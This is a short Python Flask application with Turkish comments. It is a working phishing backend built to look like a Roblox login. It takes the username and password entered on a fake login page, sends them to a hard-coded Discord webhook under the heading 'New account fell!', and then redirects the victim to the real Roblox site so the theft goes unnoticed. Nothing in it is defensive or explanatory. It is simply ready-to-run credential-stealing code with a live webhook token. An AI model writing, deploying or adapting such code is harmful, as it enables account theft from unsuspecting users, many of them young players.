import os
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Discord Webhook URL (Burası aynı kalıyor)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"

@app.route('/')
def index():
    # render_template klasöründeki login.html dosyasını açar
    return render_template('login.html') 

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')

    if DISCORD_WEBHOOK_URL.startswith("https://"):
        try:
            data = {
                "embeds": [
                    {
                        "title": "🔔 Yeni Hesap Düştü!",
                        "color": 16711680, # Kırmızı renk
                        "fields": [
                            {"name": "Kullanıcı Adı", "value": f"`{user}`", "inline": True},
                            {"name": "Şifre", "value": f"`{pw}`", "inline": True}
                        ],
                        "footer": {"text": "Roblox Login System"}
                    }
                ]
            }
            requests.post(DISCORD_WEBHOOK_URL, json=data)
        except Exception as e:
            print(f"Hata: {e}")

    # Bilgiyi aldıktan sonra kullanıcıyı gerçek Roblox sayfasına gönderiyoruz
    return redirect("https://www.roblox.com/home")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
